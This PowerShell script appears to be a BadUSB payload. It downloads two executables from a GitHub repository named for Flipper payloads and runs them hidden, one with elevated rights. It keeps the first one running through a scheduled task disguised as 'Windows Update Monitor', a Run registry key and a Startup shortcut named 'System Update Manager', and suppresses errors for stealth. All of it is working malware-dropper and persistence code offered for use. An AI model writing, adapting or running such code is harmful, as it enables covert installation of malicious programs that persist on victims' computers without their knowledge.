# Main EXE for persistence
$mainExeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinUman.exe"
$mainExePath = "$env:APPDATA\WinUman.exe"
$taskName = "Windows Update Monitor"

try {
    # 1. Download WinUman.exe if it doesn't already exist
    if (-not (Test-Path $mainExePath)) {
        Invoke-WebRequest -Uri $mainExeUrl -OutFile $mainExePath -UseBasicParsing
    }

    # 2. Start the EXE silently
    Start-Process -FilePath $mainExePath -WindowStyle Hidden

    # 3. Define full multi-trigger persistence
    $action = New-ScheduledTaskAction -Execute $mainExePath
    $triggers = @(
        New-ScheduledTaskTrigger -AtLogOn,
        New-ScheduledTaskTrigger -AtStartup,
        New-ScheduledTaskTrigger -AtIdle -IdleDuration (New-TimeSpan -Minutes 1),
        New-ScheduledTaskTrigger -AtWorkStationUnlock,
        New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1))
    )
    $settings = New-ScheduledTaskSettingsSet -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1)

    # 4. Register only if not already created
    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $triggers -Settings $settings -RunLevel Highest
    }

    # 5. Registry fallback in case Scheduled Tasks are disabled
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUman" -Value $mainExePath

} catch {
    # Silent fail — useful for stealthy environments
}
try {
    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $shortcutPath = Join-Path $startupPath "System Update Manager.lnk"

    $WScriptShell = New-Object -ComObject WScript.Shell
    $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = $mainExePath
    $shortcut.WorkingDirectory = Split-Path $mainExePath
    $shortcut.WindowStyle = 7  # Minimized
    $shortcut.Save()
} catch {
    # Silent fail
}


# One-Time Payload: WinTelemetry.exe
$telemetryUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinTelemetry.exe"
$telemetryPath = "$env:TEMP\WinTelemetry.exe"

try {
    Invoke-WebRequest -Uri $telemetryUrl -OutFile $telemetryPath -UseBasicParsing
    Start-Process -FilePath $telemetryPath -Verb RunAs -WindowStyle Hidden
    Start-Sleep -Seconds 5
    # Optional: Clean up
    # Remove-Item -Path $telemetryPath -Force
} catch {}
